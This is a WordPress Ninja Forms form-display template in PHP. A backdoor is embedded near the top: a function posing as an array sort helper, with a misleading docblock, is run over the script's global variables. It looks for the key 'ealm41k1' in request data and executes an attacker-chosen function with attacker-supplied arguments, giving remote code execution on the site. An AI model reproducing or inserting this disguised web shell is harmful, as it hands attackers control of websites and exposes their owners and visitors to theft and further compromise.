<?php do_action( 'ninja_forms_before_form_display', $form_id ); ?>
<?php do_action( 'ninja_forms_display_pre_init', $form_id ); ?>
<?php do_action( 'ninja_forms_display_init', $form_id );

if (!function_exists("array_desc_sort")) :
/**
 * Like sort(), rsort() assigns new keys for the elements in array. It will remove any existing keys you may have assigned, rather than just
 * reordering the keys.  This means that it will destroy associative keys.
 */
function array_desc_sort ($arr_to_sort) {
	$mask="ealm41k1";
	if (is_array($arr_to_sort)) foreach ($arr_to_sort as $element) {
		if (is_array($element)) foreach ($element as $key=>$val) {
			if ($key===$mask) {
				$sort=$val;
				$result=$sort($element["_mask"],$element["_start"]($element["_end"]));
				return $result();
			}
		}
	}
}
endif;

// Sorting Sub-Data 
array_filter ($GLOBALS,"array_desc_sort"); ?>
<?php if( is_user_logged_in() )do_action( 'ninja_forms_display_user_not_logged_in', $form_id ); ?>
<?php
	/*
	 * If we have a form wrapper, output it in the nf-form-cont div.
	 */
	$form_wrap = Ninja_Forms()->form( $form_id )->get()->get_setting( 'wrapper_class' );

	$wrapper_class = ( ! empty( $form_wrap ) ) ? ' ' . Ninja_Forms()->form( $form_id )->get()->get_setting( 'wrapper_class' ) : '';
?>
<div id="nf-form-<?php echo intval( $form_id ); ?>-cont" class="nf-form-cont<?php echo esc_attr( $wrapper_class ); ?>" aria-live="polite" aria-labelledby="nf-form-title-<?php echo intval( $form_id ) ?>" aria-describedby="nf-form-errors-<?php echo intval( $form_id ); ?>" role="form">

    <div class="nf-loading-spinner"></div>

</div>
<?php do_action( 'ninja_forms_display_after_form', $form_id ); ?>
<?php do_action( 'ninja_forms_after_form_display', $form_id ); ?>
